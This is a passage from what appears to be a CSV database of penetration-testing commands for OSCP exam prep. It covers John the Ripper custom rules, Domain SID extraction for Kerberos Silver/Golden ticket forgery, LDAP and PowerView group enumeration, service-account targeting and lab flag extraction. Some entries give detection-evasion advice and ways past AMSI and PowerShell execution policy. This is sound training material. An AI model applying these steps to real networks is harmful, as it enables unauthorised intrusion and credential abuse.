john --list=formats | grep -i keepass","medium","","","","","{""--list=formats"": ""List formats - Display all supported hash types. Use grep to filter (john --list=formats | grep -i md5). Common prefixes: raw- (simple hashes), dynamic- (complex formats), crypt- (Unix crypt variants). Hundreds of formats supported.""}","","",""
"john-add-custom-rules","Add Custom Rules to john.conf","enumeration","sudo sh -c 'cat <RULE_FILE> >> /etc/john/john.conf'","Append custom rules to John configuration","","sudo sh -c 'cat custom.rule >> /etc/john/john.conf'","OSCP TIP:
Create custom rules based on password policy.

Example:
Policy requires capital + 3 digits + special  Rules:
c $1 $3 $7 $!, c $1 $2 $3 $!.

Format:
[List.Rules:sshRules] then c $1 $3 $7 $!.

Test first:
echo 'password' > test.txt && john --wordlist=test.txt --rules=sshRules --stdout (verify mutations).","high","","","","","{""Rule format"": ""Rules must start with [List.Rules:RuleName] header, then one rule per line. Rule syntax: c=capitalize, $X=append X, ^X=prepend X, d=duplicate, r=reverse, etc. See /etc/john/john.conf for examples. Reference: john --list=rules""}","[""john-test-rules""]","",""
"ad-sid-whoami-extract","Extract Domain SID Using whoami","enumeration","whoami /user","Extract the current user's SID, from which the Domain SID can be derived by removing the RID (last portion after final hyphen).","domain-reconnaissance","","OSCP METHODOLOGY:
This is the FASTEST and STEALTHIEST method to obtain the Domain SID during an exam.

Unlike PowerView or other PowerShell tools, whoami is a native Windows binary that exists on every system since Windows XP and generates minimal security event logs.

It requires NO special permissions, NO PowerShell execution policy bypasses, and NO external tool downloads.

MANUAL ALTERNATIVE:
If whoami is restricted (rare), use 'wmic useraccount get name,sid' to list all local and domain accounts with their SIDs.

Domain accounts will share the same Domain SID prefix.

WHY THIS MATTERS FOR SILVER/GOLDEN TICKETS:
The Domain SID is a REQUIRED parameter when forging Kerberos tickets with Mimikatz or Rubeus.

Mimikatz's kerberos::golden module needs '/sid:S-1-5-21-DOMAIN-DOMAIN-DOMAIN' (WITHOUT the RID).

If you include the RID by mistake, the forged ticket will be invalid and authentication will fail with 'KRB_AP_ERR_MODIFIED'.

SID STRUCTURE EXPLAINED:
- S-1:
SID revision (always 1)

- 5:
SECURITY_NT_AUTHORITY (Windows security subsystem)

- 21:
Domain or local computer account (vs.

18=SYSTEM, 32=Built-in)

- Three 10-digit segments:
Domain identifier (unique per AD domain)

- Final segment (RID):
User/group/computer relative ID within domain

COMMON OSCP EXAM SCENARIO:
You've compromised a domain user account (e.g., via password spraying or AS-REP roasting).

You need to create a Silver ticket to access an HTTP SPN on a web server.

First step:
Extract Domain SID with whoami /user.

Copy everything EXCEPT the last segment after the final hyphen.

This becomes your '/sid:' parameter.

Time:
<10 seconds total (5 sec to run command, 5 sec to extract Domain SID by removing RID)

DETECTION EVASION:
whoami /user generates Event ID 4688 (Process Creation) but this is extremely common and typically not monitored.

Unlike PowerShell cmdlets that may trigger AMSI or script block logging, whoami is a compiled binary that bypasses these defenses.

OSCP EXAM TIP:
Write the Domain SID down immediately after extraction and store it in your enumeration notes.

You'll need it multiple times if you perform Silver tickets, Golden tickets, or SID history attacks.

Don't waste time re-extracting it.

CROSS-REFERENCE WITH OTHER ENUMERATION:
If you've run PowerView's Get-NetDomain, verify the Domain SID matches.

If they differ, you may be on a child domain or in a forest trust situation.

Always use the Domain SID of the target domain where you're forging tickets.","high","","","","{""Command not recognized in PowerShell"": ""PowerShell wraps whoami differently. Use: cmd /c whoami /user OR use Get-LocalUser | Select Name,SID"", ""Need Domain SID from local machine account"": ""Computer accounts also have domain SID. Same extraction method applies - remove RID from computer account SID"", ""SID format confusion (which part is Domain SID)"": ""FORMULA: S-1-5-21-[KEEP]-[KEEP]-[KEEP]-[REMOVE]. The three middle segments (each 10 digits) are the Domain SID. The last segment is the user's RID (unique identifier within domain). For Silver/Golden tickets, you need ONLY the Domain SID (S-1-5-21-KEEP-KEEP-KEEP)."", ""Verifying extracted Domain SID is correct"": ""Use 'whoami /all' to see group SIDs. All domain groups should start with the same S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX prefix (your Domain SID). If they don't match, you extracted incorrectly.""}","{""/user"": ""Displays the user name along with the Security Identifier (SID) in the format S-1-5-21-DOMAIN-DOMAIN-DOMAIN-RID. This is the most reliable built-in Windows method to obtain SID information without requiring PowerShell or external tools. The Domain SID is everything except the RID (last segment). For example, if output shows 'S-1-5-21-1987370270-658905905-1781884369-1105', the Domain SID is 'S-1-5-21-1987370270-658905905-1781884369' (remove '-1105'). This works from any privilege level and doesn't require special permissions. Essential for OSCP exams when PowerShell remoting may be restricted or you need a quick, stealthy method that doesn't generate suspicious logs. Time: <5 seconds.""}","[""crackmapexec-validate-admin""]","[""ad-sid-powerview-domain"", ""ad-sid-wmic-extract""]","[""ad-silver-ticket-mimikatz-create"", ""ad-golden-ticket-mimikatz-create""]"
"ad-sid-powerview-domain","Extract Domain SID Using PowerView","enumeration","Get-DomainSID","Directly retrieve the Domain SID of the current or specified domain using PowerView. Returns only the Domain SID without user RID, ready for use in ticket forgery.","domain-reconnaissance","","OSCP METHODOLOGY:
PowerView's Get-DomainSID is the MOST EFFICIENT method when PowerShell is available and AMSI is not blocking.

It eliminates manual parsing and reduces operator error.

However, it requires importing PowerView, which may trigger AV/EDR in realistic environments.

For OSCP exams, this is typically safe as exam machines are not running EDR, but always have a fallback method (whoami /user).

MANUAL ALTERNATIVE:
If PowerView unavailable, use ADSI directly in PowerShell:
  $root = [ADSI]""LDAP://RootDSE""
  $domain = [ADSI]""LDAP://$($root.defaultNamingContext)""
  $domain.objectSid | ForEach-Object { (New-Object Security.Principal.SecurityIdentifier($_, 0)).Value }

This achieves the same result without PowerView dependency.

WHEN TO USE THIS VS whoami /user:
- USE Get-DomainSID:
  When you have PowerShell access, PowerView is already loaded (e.g., during enumeration phase), or you need to query multiple domains in a forest.

- USE whoami /user:
  When PowerShell is restricted, AMSI is blocking, PowerView is unavailable, or you need maximum stealth (native binary, minimal logs).

POWERVIEW CONTEXT:
Get-DomainSID is part of PowerView's domain enumeration suite.

If you're already running Get-NetDomain, Get-NetUser, Get-NetComputer for reconnaissance, adding Get-DomainSID is a natural extension.

PowerView functions are designed to chain together - output from Get-DomainSID can be piped into ticket forgery automation scripts.

CROSS-DOMAIN FORESTS:
In environments with parent/child domains or forest trusts, you may encounter different Domain SIDs.

Get-DomainSID defaults to the current user's domain.

To target a specific domain:
  Get-DomainSID -Domain child.corp.com

Verify the correct domain with Get-NetDomain to see DomainName property.

OSCP EXAM TIP:
If you're using PowerView for enumeration, cache the Domain SID in a variable immediately:
  $DomainSID = Get-DomainSID
  Write-Host ""[+] Domain SID:
$DomainSID"" -ForegroundColor Green

This prevents re-querying and speeds up ticket forgery later.

Time:
<5 seconds (2 sec if PowerView pre-loaded, +10 sec if you need to import PowerView first)

DETECTION:
Generates LDAP queries to the domain controller (Event ID 4662 on DC:
Directory Service Access).

Modern EDR may flag PowerView import (AMSI scan), but LDAP queries themselves are common and rarely alerted.

If stealth is critical, use whoami /user instead.

COMPARISON WITH Get-NetDomain:
Get-NetDomain returns a DomainSID property among many others (DomainControllers, Forest, DomainName, etc.).

Get-DomainSID extracts ONLY the SID.

Use Get-NetDomain for comprehensive enumeration, Get-DomainSID for quick SID extraction.","high","","","","{""PowerView not loaded"": ""Import PowerView: Import-Module C:\\Tools\\PowerView.ps1 OR dot-source it: . .\\PowerView.ps1. If AMSI blocks, use obfuscation: Invoke-Obfuscation with AST method OR manually rename functions."", ""LDAP query timeout"": ""DC may be unreachable. Verify DC connectivity: Test-NetConnection -ComputerName DC1.corp.com -Port 389 (LDAP). If firewall blocks LDAP, fall back to ad-sid-whoami-extract method."", ""Need SID of different domain in forest"": ""Use -Domain parameter: Get-DomainSID -Domain child.corp.com. Requires trust relationship and query permissions on target domain."", ""PowerShell execution policy blocking"": ""Bypass: powershell -ExecutionPolicy Bypass -File script.ps1 OR powershell -c \""IEX (Get-Content PowerView.ps1 -Raw); Get-DomainSID\""""}","{""Get-DomainSID"": ""PowerView function that directly returns the Domain SID (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX) without the user RID appended. This is the CLEANEST method because it outputs ONLY the Domain SID - no parsing required. Internally, it queries the 'ObjectSID' attribute of the domain object in Active Directory via LDAP. Unlike whoami /user which requires manual RID removal, this returns the exact value needed for Mimikatz's '/sid:' parameter. Requires PowerView to be imported (Import-Module PowerView.ps1). Optional parameter: -Domain <domain.com> to query a different domain in a multi-domain forest. Time: <2 seconds after PowerView is loaded.""}","","[""ad-sid-whoami-extract"", ""ad-sid-wmic-extract""]","[""ad-silver-ticket-mimikatz-create"", ""ad-golden-ticket-mimikatz-create""]"
"ad-sid-wmic-extract","Extract Domain SID Using WMIC","enumeration","wmic useraccount get name,sid","List all local and domain user accounts with their SIDs using Windows Management Instrumentation Command-line (WMIC). Domain accounts share the same Domain SID prefix.","domain-reconnaissance","","OSCP METHODOLOGY:
WMIC is a LEGACY method that's useful when whoami is unavailable and PowerShell is restricted.

It's slower than whoami /user and requires more parsing, but it provides a comprehensive view of all accounts on the system.

Main advantage:
You can see ALL domain accounts at once and verify the Domain SID is consistent across them (good for validation).

MANUAL ALTERNATIVE:
If WMIC deprecated/removed, use PowerShell equivalent:
  Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID, Domain | Format-Table

This achieves identical results using PowerShell's WMI cmdlets.

WHEN TO USE THIS METHOD:
- VALIDATION:
  When you've extracted Domain SID with whoami /user and want to verify it's correct by comparing against other domain accounts

- BULK EXTRACTION:
  When you need SIDs for multiple domain users (e.g., building a target list)

- LEGACY SYSTEMS:
  Older Windows servers (2008/2012) where PowerShell may be limited but WMIC is fully functional

WHEN NOT TO USE:
- SPEED:
  whoami /user is faster (single account vs.

all accounts)

- STEALTH:
  WMIC generates more WMI events than whoami

- MODERN SYSTEMS:
  Windows 10 21H1+ shows deprecation warning

PARSING DOMAIN SID FROM OUTPUT:
1.

Identify domain accounts (exclude local SAM accounts like 'Administrator', 'Guest' if they have different SID prefix)

2.

Pick any domain account's SID (e.g., CORP\jeff:
S-1-5-21-1987370270-658905905-1781884369-1105)

3.

Remove RID (last segment):
S-1-5-21-1987370270-658905905-1781884369

4.

This is the Domain SID

VALIDATION TECHNIQUE:
All domain accounts should have the SAME Domain SID (first four segments).

If you see different Domain SIDs, you may be dealing with:
- Local vs.

domain accounts (local accounts have machine-specific SID)
- Multi-domain forest (child domain accounts have different Domain SID)
- Migrated accounts (SID history may show old SIDs)

OSCP EXAM TIP:
WMIC is NOT the first choice for Domain SID extraction (use whoami /user or Get-DomainSID instead).

However, it's valuable when you need to enumerate multiple domain user SIDs simultaneously (e.g., for SID history analysis or identifying high-value targets like RID 500 domain admin).

Time:
5-10 seconds (slower than whoami due to WMI query overhead and parsing all accounts)

DETECTION:
Generates Event ID 4688 (Process Creation for WMIC.exe) and WMI activity logs (Event ID 5857-5861 in Microsoft-Windows-WMI-Activity/Operational).

More verbose than whoami but still common activity.

EDR may flag unusual WMI queries, but useraccount enumeration is standard.

COMPATIBILITY NOTE:
WMIC was deprecated in Windows 10 version 21H1 (August 2021) and removed in some Windows 11 builds.

Always test availability with 'wmic /?'.

If unavailable, use PowerShell or whoami alternatives.","medium","","","","{""WMIC deprecated warning (Windows 10 21H1+)"": ""WMIC still functions but Microsoft recommends PowerShell alternatives. If WMIC is removed (rare), use: Get-LocalUser | Select-Object Name, SID OR Get-ADUser -Filter * -Properties SID | Select-Object Name, SID"", ""Too many accounts listed (parse domain accounts only)"": ""Filter domain accounts: wmic useraccount where \""domain='CORP'\"" get name,sid. Replace 'CORP' with your NetBIOS domain name. This excludes local SAM accounts."", ""Extract Domain SID from multiple accounts"": ""Compare SIDs of domain accounts. The first four hyphen-separated segments (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX) should be identical for all domain accounts. This is your Domain SID. The final segment (RID) will differ per account: 500=Administrator, 501=Guest, 502=krbtgt, 1000+ custom users."", ""WMIC hangs or times out"": ""WMI service (winmgmt) may be stopped. Check: sc query winmgmt. Start if needed: net start winmgmt. If remote WMI query, verify firewall allows WMI (port 135 + dynamic RPC ports).""}","{""wmic"": ""Windows Management Instrumentation Command-line tool - built-in utility for querying WMI classes. Available on all Windows systems since Windows XP (deprecated in Windows 10 21H1 but still functional for backward compatibility). Requires local administrator or equivalent WMI permissions in most configurations. Generates Event ID 4688 (Process Creation) - same as whoami, minimal suspicion."", ""useraccount"": ""WMI class representing user accounts (both local and domain). Queries Win32_UserAccount WMI class which enumerates all user accounts visible to the system. This includes local SAM accounts AND cached domain accounts. Each account entry includes Name, SID, Domain, AccountType, and other properties."", ""get name,sid"": ""Retrieves only the 'Name' and 'SID' properties from the useraccount class. This filters output to show just username and Security Identifier, making it easier to parse. Alternative: 'wmic useraccount list full' shows all properties but is verbose. The SID property displays the full SID including RID - you must manually remove the RID (last segment after final hyphen) to extract Domain SID.""}","","[""ad-sid-whoami-extract"", ""ad-sid-powerview-domain""]","[""ad-silver-ticket-mimikatz-create"", ""ad-golden-ticket-mimikatz-create""]"
"ps-get-group-members-basic","Get Group Members - Basic LDAP Query (PowerShell)","enumeration","$groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=<GROUP_NAME>))""; $group = $groupResult[0]; $group.Properties.member","Query AD group to get direct members (Distinguished Names) - first step in nested group enumeration","","$groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=Domain Admins))""; $group = $groupResult[0]; $group.Properties.member","FOUNDATION FOR NESTED GROUP ENUMERATION:
MEMBER ATTRIBUTE FORMAT:
Returns Distinguished Names:
  CN=username,CN=Users,DC=corp,DC=com

EACH DN NEEDS INDIVIDUAL QUERY:
- User (leaf node):
Stop
- Group (nested):
Requires recursion

NESTED GROUPS IN ENTERPRISE AD:
Common pattern:
Group contains groups contains users.

OSCP TARGETS:
Groups with 'Service', 'IT', 'Admin' in names.
Often contain privileged accounts buried multiple levels deep.

Time:
5 seconds per query","high","","","","{""Function not recognized"": ""Create LDAPSearch function first using ps-ldapsearch-function command"", ""Index operation failed"": ""Group not found or has no members. Verify group name with: LDAPSearch -LDAPQuery \""(objectCategory=group)\"" | select -ExpandProperty Properties | select cn"", ""No results"": ""Group name incorrect. Try wildcard: (&(objectCategory=group)(name=*<PARTIAL>*))""}","{""(&(objectCategory=group)(name=...))"": ""LDAP filter: AND operator (&) requires BOTH conditions - object must be a group AND name must match"", "".Properties.member"": ""The 'member' attribute contains Distinguished Names (DNs) of all direct group members""}","[""ps-ldapsearch-function""]","[""powerview-get-netgroupmember""]","[""ps-nested-group-check-member-type""]"
"ps-nested-group-check-member-type","Check if Group Member is User or Group (PowerShell)","enumeration","$memberDN = ""<DISTINGUISHED_NAME>""; $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""[GROUP] $($member.Properties.name[0])"" -ForegroundColor Magenta } elseif ($objectClass -contains ""user"") { Write-Host ""[USER] $($member.Properties.name[0])"" -ForegroundColor Green }","Query a group member by Distinguished Name to determine if it's a user (leaf) or nested group (requires recursion)","","$memberDN = ""CN=Administrator,CN=Users,DC=corp,DC=com""; $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""[GROUP] $($member.Properties.name[0])"" -ForegroundColor Magenta } elseif ($objectClass -contains ""user"") { Write-Host ""[USER] $($member.Properties.name[0])"" -ForegroundColor Green }","The objectClass attribute is hierarchical - users have ['top', 'person', 'organizationalPerson', 'user'], groups have ['top', 'group'].

Using '-contains' handles this hierarchy correctly.

Distinguished Names must match exactly - even extra spaces cause query failures.

OSCP:
This logic determines whether to recurse (nested group) or record (user).

In exams, you'll often find users 2-3 levels deep:
'Service Personnel'  'IT Support'  'Developers'  target user.

OBJECTCLASS ATTRIBUTE:
Hierarchical structure - users vs groups.
Using '-contains' handles hierarchy correctly.

DN MATCHING:
Must match exactly - extra spaces cause failures.

OSCP LOGIC:
- Nested group:
Recurse deeper
- User:
Record and stop

TYPICAL EXAM:
3 levels deep

Time:
2 seconds per member","high","","","","{""Index operation failed"": ""DN not found. Verify DN exact match including all commas and spaces"", ""Cannot index into null array"": ""Query returned no results. Check DN format and domain connectivity"", ""No color output"": ""Run in PowerShell console (not ISE with old versions). Colors require ANSI support.""}","{""(distinguishedName=...)"": ""LDAP filter querying by exact DN - the unique identifier for an AD object"", "".objectclass"": ""Array property containing object type hierarchy (e.g., ['top', 'person', 'user'] or ['top', 'group'])"", ""-contains"": ""PowerShell array operator - checks if 'group' or 'user' exists anywhere in the objectClass array""}","[""ps-ldapsearch-function"", ""ps-get-group-members-basic""]","[""powerview-get-netgroupmember""]","[""ps-nested-group-recursive-function""]"
"ps-nested-group-recursive-function","Recursive Nested Group Enumeration Function (PowerShell)","enumeration","function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""<GROUP_NAME>""","Complete recursive function to enumerate all users in a group hierarchy - automatically traverses nested groups and collects users","","function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""Service Personnel""","This function implements depth-first traversal of the group hierarchy.

The $Depth parameter creates visual tree output - easier to understand nesting levels during enumeration.

$script:AllUsers uses script scope (not global) to avoid polluting global namespace while remaining accessible across recursive calls.

Tree output format:
Top-level group (no indent)  Level 1 groups (2 spaces)  Level 2 groups (4 spaces)  Users (indented at their level).

OSCP:
This is the complete solution for 'unravel nested groups' lab questions.

Copy-paste this entire function, then call with target group name.

Typical exam scenario:
3 levels deep, 5-10 total users.

Time estimate:
10-15 seconds for complete enumeration.","high","","","","{""Function not recognized"": ""LDAPSearch function required. Create using ps-ldapsearch-function first"", ""Maximum recursion depth"": ""Circular group membership detected. PowerShell default limit is 100 levels. Add visited group tracking to prevent loops."", ""AllUsers array empty"": ""No users found. Check group name and verify group has members: LDAPSearch -LDAPQuery \""(&(objectCategory=group)(name=<GROUP>))\"" | select -ExpandProperty Properties | select cn,member""}","{""param([string]$GroupName, [int]$Depth = 0)"": ""Function parameters - GroupName is required, Depth tracks recursion level (default 0 for top-level)"", ""$indent = \""  \"" * $Depth"": ""Creates indentation string (2 spaces \u00d7 depth) for tree visualization"", ""$script:AllUsers += $member"": ""Script-scoped array - persists across recursive calls to collect all discovered users"", ""Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1)"": ""Recursive call - increments depth and processes nested group""}","[""ps-ldapsearch-function""]","[""powerview-get-netgroupmember""]","[""ps-get-last-nested-user""]"
"ps-get-last-nested-user","Get Last User from Nested Group Enumeration (PowerShell)","enumeration","if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; foreach ($prop in $lastUser.Properties.PropertyNames) { Write-Host ""$prop : $($lastUser.Properties[$prop])"" -ForegroundColor White } } else { Write-Host ""[-] No users found"" -ForegroundColor Red }","Display all attributes of the last user found in nested group enumeration - useful for finding flags in OSCP labs","","","OSCP LAB PATTERN:
Questions ask:
'enumerate nested groups and find the last user' then extract flag.

COMMON FLAG LOCATIONS:
- description:
Most common
- info:
Secondary
- comment:
Tertiary
- userParameters:
Rare

FLAG FORMATS:
- flag{...}
- OS{...}
- Plaintext hints
- Base64 encoded

LAST USER DEFINITION:
Last DIRECT user member discovered during depth-first traversal.
Not necessarily last alphabetically.

Time:
Instant after enumeration","high","","","","{""AllUsers variable not defined"": ""Run ps-nested-group-recursive-function first to populate the array"", ""No users found"": ""Group has no user members or only contains nested groups. Check group membership manually."", ""Index out of bounds"": ""$script:AllUsers is empty. Verify group enumeration completed successfully.""}","{""$script:AllUsers[-1]"": ""Array index -1 gets the LAST element - the final user added during nested group recursion"", ""$lastUser.Properties.PropertyNames"": ""Collection of all AD attribute names for this user object"", ""foreach ($prop in ...)"": ""Iterates through every single attribute to display complete user profile""}","[""ps-nested-group-recursive-function""]","[""powerview-get-netuser""]",""
"ps-find-new-domain-admin","Find New Domain Admin User (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=Domain Admins))"" | ForEach-Object { $_.Properties.member } | ForEach-Object { $memberDN = $_; $userSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $user = $userSearch[0]; [PSCustomObject]@{ Name = $user.Properties.samaccountname[0]; Created = $user.Properties.whencreated[0]; DN = $memberDN } } | Sort-Object Created | Format-Table -AutoSize","List all Domain Admins members with creation dates sorted chronologically - identify recently added admin accounts","","","DOMAIN ADMIN ACCOUNT AGES:
Built-in accounts:
- Administrator, krbtgt, Guest
- Creation date matches domain creation (years old)

Newly added admins:
- Recent timestamps (days/weeks old)

OSCP LAB PATTERN:
Question:
'Which NEW user is part of Domain Admins?'
Answer:
Account with most recent whencreated date.

EXCLUDE BUILT-INS:
Administrator, krbtgt, Guest

ALTERNATIVE:
Filter by whencreated > recent date.

Time:
10 seconds","high","","","","{""Cannot index into null array"": ""User object query failed. Check DN format and domain connectivity"", ""Empty Created column"": ""User object missing whencreated attribute. Try whenChanged instead"", ""No results"": ""Domain Admins group empty or you lack read permissions""}","{""whencreated"": ""AD attribute containing account creation timestamp (UTC format)"", ""Sort-Object Created"": ""Sorts results by creation date - oldest first, newest last"", ""[PSCustomObject]@{...}"": ""Creates custom object with selected properties for clean output"", ""Format-Table -AutoSize"": ""Displays results in columnar format with automatic column width""}","[""ps-ldapsearch-function""]","[""powerview-get-netgroupmember""]",""
"powerview-get-domaingroup-recursive","PowerView - Get Group Members Recursively (PowerView 3.0+)","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse","PowerView command to enumerate group members including all nested groups automatically","","Get-DomainGroupMember -Identity ""Domain Admins"" -Recurse","POWERVIEW 3.0+ CHANGES:
Parameter:
-GroupName became -Identity

FASTEST METHOD:
IF PowerView available.

WITHOUT -RECURSE:
Only direct members (one level).

WITH -RECURSE:
Flattens entire hierarchy into single list.

OUTPUT:
Includes MemberObjectClass to distinguish users from groups.

OSCP BACKUP:
PowerView may be blocked by AV.
Know manual .NET method:
ps-nested-group-recursive-function

Time:
3-5 seconds","high","","","","{""Term not recognized"": ""PowerView not imported. Load with: Import-Module .\\PowerView.ps1"", ""Parameter 'Identity' not found"": ""You have PowerView 2.0 (old). Use: Get-NetGroupMember -GroupName \""<GROUP>\"" instead"", ""Group not found"": ""Verify group name: Get-DomainGroup | Select-Object name | Where-Object { $_.name -like \""*<PARTIAL>*\"" }""}","{""-Identity"": ""PowerView 3.0+ parameter - accepts group name, DN, SID, or GUID (replaces old -GroupName parameter)"", ""-Recurse"": ""Automatically unfurls nested groups and returns all users at all levels flattened""}","","[""ps-nested-group-recursive-function""]","[""ps-powerview-get-user-details""]"
"ps-powerview-get-user-details","PowerView - Get User Full Attributes","enumeration","Get-DomainUser -Identity ""<USERNAME>"" | Format-List *","Retrieve all AD attributes for a specific user - useful for flag extraction after nested group enumeration","","Get-DomainUser -Identity ""jeff_admin"" | Format-List *","FORMAT-LIST * DISPLAYS 80+ ATTRIBUTES:
Flag locations:
- description:
Common
- info:
Secondary

Account info:
- memberof:
All group memberships
- whencreated:
Account age
- pwdlastset:
Password age
- userAccountControl:
Account flags
- adminCount:
Privilege indicator
- servicePrincipalName:
Kerberoasting target

OSCP WORKFLOW:
1.

Nested group enumeration identifies target user

2.

Use this command for full details

3.

Extract flags from attributes

Time:
2 seconds","high","","","","{""Term not recognized"": ""Import PowerView first"", ""User not found"": ""Verify username: Get-DomainUser | Select-Object samaccountname | Where-Object { $_.samaccountname -like \""*<PARTIAL>*\"" }""}","{""-Identity"": ""Accepts samAccountName, DN, SID, or GUID"", ""Format-List *"": ""PowerShell cmdlet to display ALL properties in list format (one per line) - asterisk means all properties""}","[""verify-powerview-imported""]","[""ps-get-last-nested-user""]",""
"ps-powerview-find-service-accounts","PowerView - Find Service Accounts in Groups","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse | Where-Object { $_.MemberObjectClass -eq ""user"" -and $_.MemberName -like ""*svc*"" }","Find service accounts buried in nested groups - service accounts often have weak passwords and high privileges","","Get-DomainGroupMember -Identity ""Service Personnel"" -Recurse | Where-Object { $_.MemberObjectClass -eq ""user"" -and $_.MemberName -like ""*svc*"" }","SERVICE ACCOUNT NAMING PATTERNS:
- svc_*, *svc*
- sql_*, *sql*
- backup_*, *backup*
- sa (SQL Server admin)

CHARACTERISTICS:
- Rarely changed passwords (pwdlastset old)
- Often have SPNs (Kerberoastable)
- Frequently over-privileged (Domain Admins)
- Descriptions often contain passwords/hints

OSCP:
High-value targets.
Weak passwords common.
Often reused across services.

Time:
5 seconds","high","","","","{""No results"": ""Try broader patterns: *sql*, *admin*, *backup*, *sa* (SQL Server default admin)""}","{""$_.MemberObjectClass -eq \""user\"""": ""Filters to only user objects (exclude nested groups)"", ""$_.MemberName -like \""*svc*\"""": ""PowerShell wildcard match - finds accounts with 'svc' anywhere in the name"", ""-and"": ""Logical AND - both conditions must be true""}","[""verify-powerview-imported""]","",""
"ps-extract-flag-from-user","Extract Flag from User Attributes (PowerShell)","enumeration","$user = LDAPSearch -LDAPQuery ""(samAccountName=<USERNAME>)""; $user = $user[0]; Write-Host ""`n[+] Checking flag locations:"" -ForegroundColor Yellow; @('description','info','comment','adminDescription','userParameters') | ForEach-Object { $value = $user.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } }","Check common flag storage locations in user AD attributes - targeted flag extraction for OSCP labs","","$user = LDAPSearch -LDAPQuery ""(samAccountName=jeff_admin)""; $user = $user[0]; Write-Host ""`n[+] Checking flag locations:"" -ForegroundColor Yellow; @('description','info','comment','adminDescription','userParameters') | ForEach-Object { $value = $user.Properties[$_][0]; if ($value) { Write-Host ""$_ : $value"" -ForegroundColor Cyan } }","OSCP FLAG LOCATION FREQUENCY:
- description:
70%
- info:
15%
- comment:
10%
- adminDescription:
3%
- userParameters:
2%

FLAG FORMATS:
- flag{...}:
Most common
- OS{...}:
OffSec format
- Plaintext hints
- Base64 encoded

RARE LOCATIONS:
- msDS-CloudExtensionAttribute1-10
- extensionAttribute1-15
- otherMailbox

OSCP LAB PATTERN:
'Enumerate nested groups and extract flag from last user'

Time:
2 seconds","high","","","","{""All attributes empty"": ""Flags may be in less common attributes. Check all: $user.Properties.PropertyNames | ForEach-Object { \""$_ : $($user.Properties[$_])\"" }"", ""User not found"": ""Verify username spelling and case sensitivity""}","{""@('description','info',...)"": ""PowerShell array literal - list of attribute names to check"", ""| ForEach-Object"": ""Pipeline operator - runs code block for each attribute in array"", ""$user.Properties[$_][0]"": ""$_ = current attribute name, [0] gets first value (attributes can be multi-valued)"", ""if ($value)"": ""Only displays attributes that have values (skips empty attributes)""}","[""ps-ldapsearch-function""]","[""ps-get-last-nested-user""]",""
